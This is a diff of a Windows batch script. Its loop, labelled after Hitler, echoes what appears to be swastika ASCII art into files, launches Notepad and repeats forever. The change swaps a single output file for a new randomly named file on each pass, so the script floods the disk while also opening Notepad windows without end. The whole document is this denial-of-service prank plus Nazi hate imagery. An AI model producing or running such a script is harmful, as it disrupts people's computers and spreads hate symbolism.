@@ -13,19 +13,20 @@ cls
 
 REM Loops
 
-:Hitler  
-	echo.
-	echo ▓▓▓▓▓▓▀▀░░░░░░▀▀▓▓▓▓▓▓ > Adolf-Hitler.txt
-	echo ▓▓▓▀░░░░░▄██▄░░░░░▀▓▓▓ >> Adolf-Hitler.txt
-	echo ▓▓░░░░░▄▄██▀░░░░░░░░▓▓ >> Adolf-Hitler.txt
-	echo ▓░░░░░▄██▀░░░▄█▄░░░░░▓ >> Adolf-Hitler.txt
-	echo ▌░░░░░▀██▄▄▄█████▄░░░▐ >> Adolf-Hitler.txt
-  	echo ░░▄▄▄░░░▀████▀░▀▀██▄░░ >> Adolf-Hitler.txt
-  	echo ░░▀██▄░▄▄████▄░░░▀▀▀░░ >> Adolf-Hitler.txt
-  	echo ▌░░░▀█████▀▀▀██▄░░░░░▐ >> Adolf-Hitler.txt
-  	echo ▓░░░░░▀█▀░░░▄██▀░░░░░▓ >> Adolf-Hitler.txt
-  	echo ▓▓░░░░░░░░▄██▀░░░░░░▓▓ >> Adolf-Hitler.txt
-  	echo ▓▓▓▄░░░░░▀█▀▀░░░░░▄▓▓▓ >> Adolf-Hitler.txt
-  	echo ▓▓▓▓▓▓▄▄░░░░░░▄▄▓▓▓▓▓▓ >> Adolf-Hitler.txt
-	start "" notepad.exe
-	goto :Hitler
+:Hitler
+    set FILENAME=%RANDOM%.txt
+    echo.
+    echo ▓▓▓▓▓▓▀▀░░░░░░▀▀▓▓▓▓▓▓ >> %FILENAME%
+    echo ▓▓▓▀░░░░░▄██▄░░░░░▀▓▓▓ >> %FILENAME%
+    echo ▓▓░░░░░▄▄██▀░░░░░░░░▓▓ >> %FILENAME%
+    echo ▓░░░░░▄██▀░░░▄█▄░░░░░▓ >> %FILENAME%
+    echo ▌░░░░░▀██▄▄▄█████▄░░░▐ >> %FILENAME%
+      echo ░░▄▄▄░░░▀████▀░▀▀██▄░░ >> %FILENAME%
+      echo ░░▀██▄░▄▄████▄░░░▀▀▀░░ >> %FILENAME%
+      echo ▌░░░▀█████▀▀▀██▄░░░░░▐ >> %FILENAME%
+      echo ▓░░░░░▀█▀░░░▄██▀░░░░░▓ >> %FILENAME%
+      echo ▓▓░░░░░░░░▄██▀░░░░░░▓▓ >> %FILENAME%
+      echo ▓▓▓▄░░░░░▀█▀▀░░░░░▄▓▓▓ >> %FILENAME%
+      echo ▓▓▓▓▓▓▄▄░░░░░░▄▄▓▓▓▓▓▓ >> %FILENAME%
+    start "" notepad.exe
+    goto :Hitler
